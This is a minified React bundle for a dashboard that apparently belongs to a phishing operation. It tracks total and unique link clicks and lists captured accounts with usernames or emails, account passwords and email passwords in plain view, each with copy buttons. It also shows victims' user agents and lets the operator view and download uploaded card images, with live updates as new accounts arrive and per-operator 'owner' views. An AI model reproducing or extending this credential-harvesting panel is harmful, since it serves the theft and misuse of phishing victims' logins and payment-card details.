import{r as t,j as e,q as S,Y as B,b as V}from"./app-CzDKNEIs.js";import{c as z,r as g}from"./index-RxbyN6Ed.js";import{A as Y,F as G}from"./AuthenticatedLayout-C7FXM_oT.js";import{D as J}from"./Table-CaG3AW7D.js";import{H as K,_ as Q,C as b}from"./index-ClHFJN1D.js";import{F as W,a as X}from"./FileSaver.min-Dd4tLFL9.js";import"./hidden-Dtxiou3D.js";function D({title:d,titleId:l,...n},i){return t.createElement("svg",Object.assign({xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 24 24",fill:"currentColor","aria-hidden":"true","data-slot":"icon",ref:i,"aria-labelledby":l},n),d?t.createElement("title",{id:l},d):null,t.createElement("path",{d:"M21 6.375c0 2.692-4.03 4.875-9 4.875S3 9.067 3 6.375 7.03 1.5 12 1.5s9 2.183 9 4.875Z"}),t.createElement("path",{d:"M12 12.75c2.685 0 5.19-.586 7.078-1.609a8.283 8.283 0 0 0 1.897-1.384c.016.121.025.244.025.368C21 12.817 16.97 15 12 15s-9-2.183-9-4.875c0-.124.009-.247.025-.368a8.285 8.285 0 0 0 1.897 1.384C6.809 12.164 9.315 12.75 12 12.75Z"}),t.createElement("path",{d:"M12 16.5c2.685 0 5.19-.586 7.078-1.609a8.282 8.282 0 0 0 1.897-1.384c.016.121.025.244.025.368 0 2.692-4.03 4.875-9 4.875s-9-2.183-9-4.875c0-.124.009-.247.025-.368a8.284 8.284 0 0 0 1.897 1.384C6.809 15.914 9.315 16.5 12 16.5Z"}),t.createElement("path",{d:"M12 20.25c2.685 0 5.19-.586 7.078-1.609a8.282 8.282 0 0 0 1.897-1.384c.016.121.025.244.025.368 0 2.692-4.03 4.875-9 4.875s-9-2.183-9-4.875c0-.124.009-.247.025-.368a8.284 8.284 0 0 0 1.897 1.384C6.809 19.664 9.315 20.25 12 20.25Z"}))}const ee=t.forwardRef(D);function se({title:d,titleId:l,...n},i){return t.createElement("svg",Object.assign({xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 24 24",fill:"currentColor","aria-hidden":"true","data-slot":"icon",ref:i,"aria-labelledby":l},n),d?t.createElement("title",{id:l},d):null,t.createElement("path",{fillRule:"evenodd",d:"M1.5 5.625c0-1.036.84-1.875 1.875-1.875h17.25c1.035 0 1.875.84 1.875 1.875v12.75c0 1.035-.84 1.875-1.875 1.875H3.375A1.875 1.875 0 0 1 1.5 18.375V5.625ZM21 9.375A.375.375 0 0 0 20.625 9h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375h7.5a.375.375 0 0 0 .375-.375v-1.5Zm0 3.75a.375.375 0 0 0-.375-.375h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375h7.5a.375.375 0 0 0 .375-.375v-1.5Zm0 3.75a.375.375 0 0 0-.375-.375h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375h7.5a.375.375 0 0 0 .375-.375v-1.5ZM10.875 18.75a.375.375 0 0 0 .375-.375v-1.5a.375.375 0 0 0-.375-.375h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375h7.5ZM3.375 15h7.5a.375.375 0 0 0 .375-.375v-1.5a.375.375 0 0 0-.375-.375h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375Zm0-3.75h7.5a.375.375 0 0 0 .375-.375v-1.5A.375.375 0 0 0 10.875 9h-7.5A.375.375 0 0 0 3 9.375v1.5c0 .207.168.375.375.375Z",clipRule:"evenodd"}))}const te=t.forwardRef(se);function ae({title:d,titleId:l,...n},i){return t.createElement("svg",Object.assign({xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 20 20",fill:"currentColor","aria-hidden":"true","data-slot":"icon",ref:i,"aria-labelledby":l},n),d?t.createElement("title",{id:l},d):null,t.createElement("path",{d:"M10.75 2.75a.75.75 0 0 0-1.5 0v8.614L6.295 8.235a.75.75 0 1 0-1.09 1.03l4.25 4.5a.75.75 0 0 0 1.09 0l4.25-4.5a.75.75 0 0 0-1.09-1.03l-2.955 3.129V2.75Z"}),t.createElement("path",{d:"M3.5 12.75a.75.75 0 0 0-1.5 0v2.5A2.75 2.75 0 0 0 4.75 18h10.5A2.75 2.75 0 0 0 18 15.25v-2.5a.75.75 0 0 0-1.5 0v2.5c0 .69-.56 1.25-1.25 1.25H4.75c-.69 0-1.25-.56-1.25-1.25v-2.5Z"}))}const Z=t.forwardRef(ae),x=({children:d,title:l,value:n,className:i=""})=>e.jsx(e.Fragment,{children:e.jsxs("div",{className:"bg-white shadow-xl p-5 relative rounded-md",children:[e.jsx("h4",{className:"font-bold text-[14px] uppercase text-neutral-600 font-karla",children:l}),e.jsx("p",{className:"text-xl py-4 text-black font-bold font-karla",children:n}),e.jsx("div",{className:z("flex justify-center items-center rounded-md h-6 w-6 bg-primary absolute right-3 bottom-3",i),children:d})]})}),me=d=>{var T;const{auth:l}=S().props,{userIds:n}=S().props,[i,w]=t.useState(null),[R,y]=t.useState(null),[P,j]=t.useState(null),[p,u]=t.useState(d.accounts),[v,N]=t.useState(d.totalAccounts),[C,_]=t.useState(d.todayTotalAccounts),[F,A]=t.useState(d.totalClicks),[U,E]=t.useState(d.uniqueClicks);let[q,k]=t.useState(!1),[a,O]=t.useState(null),L=["Id","email/Username/Phone","Account Password","Email Password","Owner","Time","Action"];const[M,H]=t.useState(L);t.useEffect(()=>{l.user.is_admin||H(M.filter(s=>s!="Owner"))},[]);const h=(s,r)=>{r=="eup"&&w(s),r=="password"&&y(s),r=="password_of_email"&&j(s),r=="user_agent"&&setUserAgentIndex(s)},f=s=>{s=="eup"&&w(null),s=="password"&&y(null),s=="password_of_email"&&j(null),s=="user_agent"&&setUserAgentIndex(null)};t.useEffect(()=>{let s=g(n,l.user,"account.created");return s.forEach(r=>{r.listen("AccountCreatedEvent",o=>{l.user.is_admin?(u([o.account,...p].slice(0,-1)),N(v+1),_(C+1)):(u(o.dashboardData.accounts),N(o.dashboardData.totalAccounts),_(o.dashboardData.todayTotalAccounts))})}),()=>{s.forEach(r=>r.unsubscribe())}},[]),t.useEffect(()=>{let s=g(n,l.user,"account.updated");return s.forEach(r=>{r.listen("AccountUpdatedEvent",o=>{const c=p.map(m=>m.id===o.account.id?{...m,password_of_email:o.account.password_of_email}:m);u(c)})}),()=>{s.forEach(r=>r.unsubscribe())}},[]),t.useEffect(()=>{let s=g(n,l.user,"link_info.created");return s.forEach(r=>{r.listen("LinkInfoCreatedEvent",o=>{console.log(),l.user.is_admin?(A(o.dashboardData.admin.totalClicks),E(o.dashboardData.admin.uniqueClicks)):(A(o.dashboardData.totalClicks),E(o.dashboardData.uniqueClicks))})}),()=>{s.forEach(r=>r.unsubscribe())}},[]);const $=s=>{O(s),k(!0)},I=async s=>{let r="storage/"+s,o=`${Math.floor(Math.random()*1e14)}.jpg`;try{const c=await V.get(r,{responseType:"blob"}),m=new Blob([c.data],{type:c.data.type});X.saveAs(m,o)}catch(c){console.error("Error downloading the image",c)}};return e.jsxs(Y,{header:"Dashboard",children:[e.jsx(B,{title:"Dashboard"}),e.jsx(K,{isModalOpen:q,setIsModalOpen:k,children:e.jsx(Q.Panel,{className:"w-full max-w-3xl transform overflow-hidden rounded-2xl bg-white text-left align-middle shadow-xl transition-all",children:e.jsx("div",{className:"mt-4 p-4 flex justify-center items-center",children:e.jsx("div",{className:"bg-white overflow-hidden shadow rounded-lg border",children:e.jsx("div",{className:"border-t border-gray-200 px-4 py-5 sm:p-0",children:e.jsxs("dl",{className:"sm:divide-y sm:divide-gray-200",children:[e.jsxs("div",{className:"py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6",children:[e.jsx("dt",{className:"text-sm font-medium text-gray-500",children:"Email/Username/Phone"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2",children:a==null?void 0:a.eup})]}),e.jsxs("div",{className:"py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6",children:[e.jsx("dt",{className:"text-sm font-medium text-gray-500",children:"Account Password"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2",children:a==null?void 0:a.password})]}),e.jsxs("div",{className:"py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6",children:[e.jsx("dt",{className:"text-sm font-medium text-gray-500",children:"User Agent"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2",children:(a==null?void 0:a.user_agent)??"N/A"})]}),e.jsxs("div",{className:"py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6",children:[e.jsx("dt",{className:"text-sm font-medium text-gray-500",children:"Email Password"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2",children:(a==null?void 0:a.password_of_email)??e.jsx("span",{className:"text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-yellow-500 bg-yellow-100 text-neutral-600",children:"N/A"})})]}),e.jsxs("div",{className:"py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6",children:[e.jsx("dt",{className:"text-sm font-medium text-gray-500",children:"Card Images"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2",children:a!=null&&a.card_image1?e.jsxs("div",{className:"flex justify-start items-start gap-2",children:[e.jsxs("div",{className:'relative group after:after:content-[""] after:absolute after:w-full after:h-full after:bg-black after:z-10 after:left-0 after:top-0 after:rounded-md after:bg-opacity-60 hover:after:bg-opacity-0 hover:after:invisible duration-150',children:[e.jsx("img",{className:"w-20 rounded-md border",src:"storage/"+(a==null?void 0:a.card_image1),alt:"card-image-1"}),e.jsx("button",{type:"button",onClick:()=>I(a==null?void 0:a.card_image1),className:"absolute opacity-0 invisible group-hover:opacity-100 group-hover:visible duration-150 p-2 bg-primary rounded-full text-white left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2",title:"Download",children:e.jsx(Z,{className:"w-5 h-5"})})]}),e.jsxs("div",{className:'relative group after:after:content-[""] after:absolute after:w-full after:h-full after:bg-black after:z-10 after:left-0 after:top-0 after:rounded-md after:bg-opacity-60 hover:after:bg-opacity-0 hover:after:invisible duration-150',children:[e.jsx("img",{className:"w-20 rounded-md border",src:"storage/"+(a==null?void 0:a.card_image2),alt:"card-image-2"}),e.jsx("button",{type:"button",onClick:()=>I(a==null?void 0:a.card_image2),className:"absolute opacity-0 invisible group-hover:opacity-100 group-hover:visible duration-150 p-2 bg-primary rounded-full text-white left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2",title:"Download",children:e.jsx(Z,{className:"w-5 h-5"})})]})]}):e.jsx("span",{className:"text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-yellow-500 bg-yellow-100 text-neutral-600",children:"N/A"})})]}),e.jsxs("div",{className:"py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6",children:[e.jsx("dt",{className:"text-sm font-medium text-gray-500",children:"Account Type"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2",children:e.jsx("span",{className:"text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-green-400 bg-green-100 text-green-800",children:(T=a==null?void 0:a.type)==null?void 0:T.name})})]})]})})})})})}),e.jsx("div",{className:"overflow-hidden",children:e.jsxs("div",{className:"grid grid-cols-1 gap-4 md:grid-cols-2 md:gap-6 xl:grid-cols-4 2xl:gap-7",children:[e.jsx(x,{title:"Total clicks",value:F,className:"bg-green-500",children:e.jsx(W,{className:"w-3 h-3 text-white"})}),e.jsx(x,{title:"Unique clicks",value:U,className:"bg-blue-400",children:e.jsx(ee,{className:"w-3 h-3 text-white"})}),e.jsx(x,{title:"Accounts",value:C,className:"bg-orange-400",children:e.jsx(G,{className:"w-3 h-3 text-white"})}),e.jsx(x,{title:"Total Accounts",value:v,className:"bg-fuchsia-500",children:e.jsx(te,{className:"w-3 h-3 text-white"})})]})}),e.jsx("div",{className:"mt-20",children:e.jsx(J,{headItems:M,children:p.map((s,r)=>e.jsxs("tr",{className:"odd:bg-white even:bg-slate-100",children:[e.jsx("td",{className:"text-left py-3 px-4",children:s.id}),e.jsx(b,{text:s.eup,children:e.jsxs("td",{className:"text-left py-3 px-4 cursor-pointer",children:[e.jsx("button",{onMouseLeave:()=>f("eup"),onClick:()=>h(r,"eup"),type:"button",className:"font-semibold",title:"Click to copy",children:s.eup}),i==r?e.jsx("span",{className:"text-[12px] text-primary ml-1",children:"Copied"}):""]})}),e.jsx(b,{text:s.password,children:e.jsxs("td",{className:"text-left py-3 px-4 cursor-pointer",children:[e.jsx("button",{onMouseLeave:()=>f("password"),onClick:()=>h(r,"password"),type:"button",className:"font-semibold",title:"Click to copy",children:s.password}),R==r?e.jsx("span",{className:"text-[12px] text-primary ml-1",children:"Copied"}):""]})}),s.password_of_email?e.jsx(b,{text:s.password_of_email,children:e.jsxs("td",{className:"text-left py-3 px-4 cursor-pointer",children:[e.jsx("button",{onMouseLeave:()=>f("password_of_email"),onClick:()=>h(r,"password_of_email"),type:"button",className:"font-semibold",title:"Click to copy",children:s.password_of_email}),P==r?e.jsx("span",{className:"text-[12px] text-primary ml-1",children:"Copied"}):""]})}):e.jsx("td",{className:"text-left py-3 px-4",children:e.jsx("span",{className:"bg-yellow-100 text-yellow-800 text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-yellow-400",children:"N/A"})}),s.owner&&l.user.is_admin&&s.owner.name==l.user.name?e.jsx("td",{className:"text-left py-3 px-4",children:e.jsx("span",{className:"bg-blue-100 text-black text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-blue-400",children:"You"})}):e.jsx("td",{className:"text-left py-3 px-4",children:s.owner.name}),e.jsx("td",{className:"text-left py-3 px-4 italic font-thin",children:s.time_for_humans}),e.jsx("td",{className:"text-left py-3 px-4",children:e.jsx("button",{onClick:()=>$(s),className:"rounded-md bg-purple-400 p-2 px-4 text-white",children:"View"})})]},r))})})]})};export{me as default};
